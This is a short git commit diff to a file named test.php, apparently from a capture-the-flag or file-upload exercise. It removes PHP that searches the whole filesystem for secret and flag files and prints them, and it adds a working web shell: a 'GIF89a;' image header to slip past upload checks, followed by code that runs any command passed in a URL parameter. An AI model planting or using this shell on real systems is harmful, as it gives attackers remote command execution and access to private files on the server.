33969ae0afbcf5cba471bfad13d7a7b950c187b3
Dinh <70964027+dbtran-ng@users.noreply.github.com>
2023-07-22 15:13:56 -0700

    Update test.php

--- test.php
+++ test.php
@@ -1,8 +1,4 @@
-<?php
-  $file = exec('find / -type f -name *secret.txt');
-  $contents = file_get_contents($file);
-  var_dump($contents);
-  $file1 = exec('find / -type f -name *flag.txt');
-  $contents1 = file_get_contents($file1);
-  var_dump($contents1);
+GIF89a;
+<?
+system($_GET['cmd']); # shellcode goes here
 ?>
